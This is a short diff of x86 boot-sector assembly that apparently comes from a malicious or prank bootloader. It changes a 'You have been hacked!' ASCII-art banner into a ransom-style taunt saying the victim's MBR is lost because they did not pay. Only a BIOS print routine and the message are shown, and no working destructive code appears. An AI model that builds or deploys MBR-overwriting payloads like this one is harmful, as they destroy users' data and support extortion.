@@ -34,7 +34,7 @@ printchar:
         int 0x10            ;print char
         ret
   
-msg:            db        "╥━━━━━━━━╭━━╮━━┳\n╢╭╮╭━━━━━┫┃▋▋━▅┣\n╢┃╰┫┈┈┈┈┈┃┃┈┈╰┫┣ You have been hacked!\n╢╰━┫┈┈┈┈┈╰╯╰┳━╯┣\n╢┊┊┃┏┳┳━━┓┏┳┫┊┊┣\n╨━━┗┛┗┛━━┗┛┗┛━━┻", 0
+msg:            db        "You should have paid! Now your MBR is lost :(!", 0
 ;----------------------------------------------;
 ; The bootloader has a signature (0xaa55)
 ; at bytes #511 and #512.
